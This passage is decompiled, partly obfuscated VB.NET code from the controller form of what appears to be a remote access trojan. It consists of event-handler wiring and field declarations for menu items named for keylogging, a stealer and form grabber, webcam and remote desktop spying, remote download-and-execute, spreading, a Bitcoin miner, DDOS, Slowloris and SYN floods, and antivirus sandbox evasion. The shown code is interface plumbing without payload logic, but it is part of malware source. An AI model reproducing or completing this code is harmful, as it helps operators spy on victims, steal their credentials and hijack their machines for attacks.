            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me.timer_0 Is Nothing) Then
                    RemoveHandler Me.timer_0.Tick, handler
                End If
                Me.timer_0 = value
                If (Not Me.timer_0 Is Nothing) Then
                    AddHandler Me.timer_0.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property ToolStripMenuItem1 As ToolStripSeparator
            Get
                Return Me._ToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripMenuItem1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
            Get
                Return Me._ToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.method_12)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.method_11)
                Dim handler3 As EventHandler = New EventHandler(AddressOf Me.method_5)
                If (Not Me._ToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._ToolStripMenuItem2.MouseLeave, handler
                    RemoveHandler Me._ToolStripMenuItem2.MouseEnter, handler2
                    RemoveHandler Me._ToolStripMenuItem2.Click, handler3
                End If
                Me._ToolStripMenuItem2 = value
                If (Not Me._ToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._ToolStripMenuItem2.MouseLeave, handler
                    AddHandler Me._ToolStripMenuItem2.MouseEnter, handler2
                    AddHandler Me._ToolStripMenuItem2.Click, handler3
                End If
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator1 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator10 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator10 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator11 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator11
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator11 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator12 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator12
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator12 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator13 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator13
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator13 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator2 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator2 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator3 As ToolStripSeparator
            Get
                Return Me.CbrcOhuJaN
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me.CbrcOhuJaN = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator4 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator4 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator5 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator5 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator6 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator6 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator7 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator7 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator8 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator8 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator9 As ToolStripSeparator
            Get
                Return Me._ToolStripSeparator9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSeparator)
                Me._ToolStripSeparator9 = value
            End Set
        End Property

        Friend Overridable Property ToolStripSplitButton1 As ToolStripSplitButton
            Get
                Return Me._ToolStripSplitButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripSplitButton)
                Me._ToolStripSplitButton1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripStatusLabel1 As ToolStripStatusLabel
            Get
                Return Me._ToolStripStatusLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripStatusLabel)
                Me._ToolStripStatusLabel1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripStatusLabel2 As ToolStripStatusLabel
            Get
                Return Me._ToolStripStatusLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripStatusLabel)
                Me._ToolStripStatusLabel2 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox1 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox10 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox10 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox11 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox11
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox11 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox12 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox12
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox12 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox13 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox13
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox13 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox14 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox14
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ToolStripTextBox14_Click)
                If (Not Me._ToolStripTextBox14 Is Nothing) Then
                    RemoveHandler Me._ToolStripTextBox14.Click, handler
                End If
                Me._ToolStripTextBox14 = value
                If (Not Me._ToolStripTextBox14 Is Nothing) Then
                    AddHandler Me._ToolStripTextBox14.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox2 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox2 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox3 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox3 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox4 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox4 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox5 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox5 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox6 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox6 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox7 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox7 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox8 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox8 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox9 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox9 = value
            End Set
        End Property

        Friend Overridable Property TracerouteIPToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._TracerouteIPToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TracerouteIPToolStripMenuItem_Click)
                If (Not Me._TracerouteIPToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._TracerouteIPToolStripMenuItem.Click, handler
                End If
                Me._TracerouteIPToolStripMenuItem = value
                If (Not Me._TracerouteIPToolStripMenuItem Is Nothing) Then
                    AddHandler Me._TracerouteIPToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property txtListening As ToolStripStatusLabel
            Get
                Return Me._txtListening
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripStatusLabel)
                Me._txtListening = value
            End Set
        End Property

        Friend Overridable Property txtOnline As ToolStripStatusLabel
            Get
                Return Me.YmuEnWtCyp
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripStatusLabel)
                Me.YmuEnWtCyp = value
            End Set
        End Property

        Friend Overridable Property UDPToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._UDPToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._UDPToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property UnfreezeToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._UnfreezeToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._UnfreezeToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property UsbToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._UsbToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UsbToolStripMenuItem_Click)
                If (Not Me._UsbToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UsbToolStripMenuItem.Click, handler
                End If
                Me._UsbToolStripMenuItem = value
                If (Not Me._UsbToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UsbToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UsernameToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._UsernameToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UsernameToolStripMenuItem_Click)
                If (Not Me._UsernameToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UsernameToolStripMenuItem.Click, handler
                End If
                Me._UsernameToolStripMenuItem = value
                If (Not Me._UsernameToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UsernameToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property VersionToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._VersionToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.VersionToolStripMenuItem_Click)
                If (Not Me._VersionToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._VersionToolStripMenuItem.Click, handler
                End If
                Me._VersionToolStripMenuItem = value
                If (Not Me._VersionToolStripMenuItem Is Nothing) Then
                    AddHandler Me._VersionToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ViewRemoteDesktopToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ViewRemoteDesktopToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ViewRemoteDesktopToolStripMenuItem_Click)
                If (Not Me._ViewRemoteDesktopToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ViewRemoteDesktopToolStripMenuItem.Click, handler
                End If
                Me._ViewRemoteDesktopToolStripMenuItem = value
                If (Not Me._ViewRemoteDesktopToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ViewRemoteDesktopToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property VisitWebsiteToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._VisitWebsiteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.VisitWebsiteToolStripMenuItem_Click)
                If (Not Me._VisitWebsiteToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._VisitWebsiteToolStripMenuItem.Click, handler
                End If
                Me._VisitWebsiteToolStripMenuItem = value
                If (Not Me._VisitWebsiteToolStripMenuItem Is Nothing) Then
                    AddHandler Me._VisitWebsiteToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property WebcamToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._WebcamToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.WebcamToolStripMenuItem_Click)
                If (Not Me._WebcamToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._WebcamToolStripMenuItem.Click, handler
                End If
                Me._WebcamToolStripMenuItem = value
                If (Not Me._WebcamToolStripMenuItem Is Nothing) Then
                    AddHandler Me._WebcamToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Win8Progressbar1 As Win8Progressbar
            Get
                Return Me._Win8Progressbar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Win8Progressbar)
                Me._Win8Progressbar1 = value
            End Set
        End Property

        Friend Overridable Property WindowsKeyToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._WindowsKeyToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.WindowsKeyToolStripMenuItem_Click)
                If (Not Me._WindowsKeyToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._WindowsKeyToolStripMenuItem.Click, handler
                End If
                Me._WindowsKeyToolStripMenuItem = value
                If (Not Me._WindowsKeyToolStripMenuItem Is Nothing) Then
                    AddHandler Me._WindowsKeyToolStripMenuItem.Click, handler
                End If
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("AntiAvastSandBoxToolStripMenuItem")> _
        Private _AntiAvastSandBoxToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("AttackToolStripMenuItem")> _
        Private _AttackToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("BinderToolStripMenuItem")> _
        Private _BinderToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("BinderToolStripMenuItem1")> _
        Private _BinderToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("BipSoundToolStripMenuItem")> _
        Private _BipSoundToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("BitCoinMinerToolStripMenuItem")> _
        Private _BitCoinMinerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("BotkillToolStripMenuItem")> _
        Private _BotkillToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("BSODToolStripMenuItem")> _
        Private _BSODToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("CheckBox1")> _
        Private _CheckBox1 As CheckBox
        <AccessedThroughProperty("ClearTraceHistoryToolStripMenuItem")> _
        Private _ClearTraceHistoryToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CloseCDToolStripMenuItem")> _
        Private _CloseCDToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CloseToolStripMenuItem")> _
        Private _CloseToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ComboBox1")> _
        Private _ComboBox1 As ComboBox
        <AccessedThroughProperty("ComputerNameToolStripMenuItem")> _
        Private _ComputerNameToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ComputerToolStripMenuItem")> _
        Private _ComputerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ContextMenuStrip1")> _
        Private _ContextMenuStrip1 As ContextMenuStrip
        <AccessedThroughProperty("ContextMenuStrip2")> _
        Private _ContextMenuStrip2 As ContextMenuStrip
        <AccessedThroughProperty("ContextMenuStrip3")> _
        Private _ContextMenuStrip3 As ContextMenuStrip
        <AccessedThroughProperty("CountryToolStripMenuItem")> _
        Private _CountryToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DDOSToolStripMenuItem")> _
        Private _DDOSToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DisableMouseAndKeyboardToolStripMenuItem")> _
        Private _DisableMouseAndKeyboardToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("EnableMouseAndKeyboardToolStripMenuItem")> _
        Private _EnableMouseAndKeyboardToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("EToolStripMenuItem")> _
        Private _EToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ExitToolStripMenuItem")> _
        Private _ExitToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ExitToolStripMenuItem1")> _
        Private _ExitToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("ExtensionChangerToolStripMenuItem")> _
        Private _ExtensionChangerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ExtraToolStripMenuItem")> _
        Private _ExtraToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FacebookToolStripMenuItem")> _
        Private _FacebookToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FileManagerToolStripMenuItem")> _
        Private _FileManagerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FileToolStripMenuItem")> _
        Private _FileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FixMouseButtonToolStripMenuItem")> _
        Private _FixMouseButtonToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FormGrabberToolStripMenuItem")> _
        Private _FormGrabberToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FreezeToolStripMenuItem")> _
        Private _FreezeToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FunStuffToolStripMenuItem")> _
        Private _FunStuffToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("GetIPToolStripMenuItem")> _
        Private _GetIPToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("getloggg")> _
        Private _getloggg As TextBox
        <AccessedThroughProperty("GetRecordToolStripMenuItem")> _
        Private _GetRecordToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("HideShowColumsToolStripMenuItem")> _
        Private _HideShowColumsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("HideTaskbarToolStripMenuItem")> _
        Private _HideTaskbarToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("IPAdressToolStripMenuItem")> _
        Private _IPAdressToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("KeyloggzeToolStripMenuItem")> _
        Private _KeyloggzeToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("KillToolStripMenuItem")> _
        Private _KillToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("LanToolStripMenuItem")> _
        Private _LanToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ListenToolStripMenuItem")> _
        Private _ListenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ListToolStripMenuItem")> _
        Private _ListToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ListView1")> _
        Private _ListView1 As ListView
        <AccessedThroughProperty("lstClients")> _
        Private _lstClients As ListView
        <AccessedThroughProperty("MatrixScreenToolStripMenuItem")> _
        Private _MatrixScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("MenuStrip1")> _
        Private _MenuStrip1 As MenuStrip
        <AccessedThroughProperty("MessageBoxToolStripMenuItem1")> _
        Private _MessageBoxToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("MsnControlToolStripMenuItem")> _
        Private _MsnControlToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("NoipUpdateToolStripMenuItem")> _
        Private _NoipUpdateToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("NumberOfConnectionsMaxToolStripMenuItem")> _
        Private _NumberOfConnectionsMaxToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem")> _
        Private _OkToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem1")> _
        Private _OkToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem2")> _
        Private _OkToolStripMenuItem2 As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem3")> _
        Private _OkToolStripMenuItem3 As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem4")> _
        Private _OkToolStripMenuItem4 As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem5")> _
        Private _OkToolStripMenuItem5 As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem6")> _
        Private _OkToolStripMenuItem6 As ToolStripMenuItem
        <AccessedThroughProperty("OkToolStripMenuItem7")> _
        Private _OkToolStripMenuItem7 As ToolStripMenuItem
        <AccessedThroughProperty("OpenCDToolStripMenuItem")> _
        Private _OpenCDToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenWebsiteToolStripMenuItem")> _
        Private _OpenWebsiteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OSToolStripMenuItem")> _
        Private _OSToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("PingToolStripMenuItem")> _
        Private _PingToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("PlayMusicToolStripMenuItem")> _
        Private _PlayMusicToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("PortScannerToolStripMenuItem")> _
        Private _PortScannerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ProcessesToolStripMenuItem")> _
        Private _ProcessesToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RandomCursorToolStripMenuItem")> _
        Private _RandomCursorToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RandomIconDesktopToolStripMenuItem")> _
        Private _RandomIconDesktopToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RecordAudioToolStripMenuItem")> _
        Private _RecordAudioToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RecordToolStripMenuItem")> _
        Private _RecordToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RefreshToolStripMenuItem")> _
        Private _RefreshToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RemoteDownloadExecuteToolStripMenuItem")> _
        Private _RemoteDownloadExecuteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RemoteFileManagerToolStripMenuItem")> _
        Private _RemoteFileManagerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ResHackerToolStripMenuItem")> _
        Private _ResHackerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RestartToolStripMenuItem")> _
        Private _RestartToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RestartToolStripMenuItem1")> _
        Private _RestartToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("RichTextBox2")> _
        Private _RichTextBox2 As RichTextBox
        <AccessedThroughProperty("RichTextBox3")> _
        Private _RichTextBox3 As RichTextBox
        <AccessedThroughProperty("RichTextBox4")> _
        Private _RichTextBox4 As RichTextBox
        <AccessedThroughProperty("SaveToFileToolStripMenuItem")> _
        Private _SaveToFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ServerEditorToolStripMenuItem")> _
        Private _ServerEditorToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ServerToolStripMenuItem")> _
        Private _ServerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SettingsToolStripMenuItem")> _
        Private _SettingsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShowSystemInformationToolStripMenuItem")> _
        Private _ShowSystemInformationToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShowTaskbarToolStripMenuItem")> _
        Private _ShowTaskbarToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShowToolStripMenuItem")> _
        Private _ShowToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShutdownToolStripMenuItem")> _
        Private _ShutdownToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SideTab1")> _
        Private _SideTab1 As Control0
        <AccessedThroughProperty("SkypeToolStripMenuItem")> _
        Private _SkypeToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SlowlorisToolStripMenuItem")> _
        Private _SlowlorisToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Sock5ToolStripMenuItem")> _
        Private _Sock5ToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SpeakComputerToolStripMenuItem")> _
        Private _SpeakComputerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SpreadToolStripMenuItem")> _
        Private _SpreadToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SSYNToolStripMenuItem")> _
        Private _SSYNToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem")> _
        Private _StartToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem1")> _
        Private _StartToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem2")> _
        Private _StartToolStripMenuItem2 As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem3")> _
        Private _StartToolStripMenuItem3 As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem4")> _
        Private _StartToolStripMenuItem4 As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem5")> _
        Private _StartToolStripMenuItem5 As ToolStripMenuItem
        <AccessedThroughProperty("StartToolStripMenuItem6")> _
        Private _StartToolStripMenuItem6 As ToolStripMenuItem
        <AccessedThroughProperty("StatusStrip1")> _
        Private _StatusStrip1 As StatusStrip
        <AccessedThroughProperty("StatusToolStripMenuItem")> _
        Private _StatusToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("StealerToolStripMenuItem")> _
        Private _StealerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("StopRecordToolStripMenuItem")> _
        Private _StopRecordToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("StopToolStripMenuItem")> _
        Private _StopToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("StopToolStripMenuItem1")> _
        Private _StopToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("StopToolStripMenuItem2")> _
        Private _StopToolStripMenuItem2 As ToolStripMenuItem
